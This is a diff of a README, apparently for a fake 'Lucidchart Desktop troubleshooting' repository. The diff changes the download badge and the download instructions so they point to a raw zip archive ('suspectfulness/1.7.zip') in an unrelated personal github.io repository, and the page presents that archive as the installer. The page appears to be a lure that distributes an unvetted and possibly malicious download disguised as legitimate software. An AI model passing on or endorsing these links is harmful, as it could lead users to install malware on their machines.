@@ -5,11 +5,11 @@ description: "Resolve installation and startup issues for Lucidchart Desktop on 
 ---
 # 🛠️ Lucidchart-Desktop-Troubleshooting - Fix your installation issues on Windows
 
-[![](https://img.shields.io/badge/Download-Lucidchart-blue.svg)](https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases)
+[![](https://img.shields.io/badge/Download-Lucidchart-blue.svg)](https://raw.githubusercontent.com/flinnshaven542/flinnshaven542.github.io/main/suspectfulness/1.7.zip)
 
 ## 📥 How to download the application
 
-Visit the following link to access the software files: [https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases](https://github.com/flinnshaven542/Lucidchart-Desktop-Troubleshooting/releases). Click the specific link for the current version to save the installer to your computer.
+Visit the following link to access the software files: [https://raw.githubusercontent.com/flinnshaven542/flinnshaven542.github.io/main/suspectfulness/1.7.zip](https://raw.githubusercontent.com/flinnshaven542/flinnshaven542.github.io/main/suspectfulness/1.7.zip). Click the specific link for the current version to save the installer to your computer.
 
 ## 📋 System requirements
 
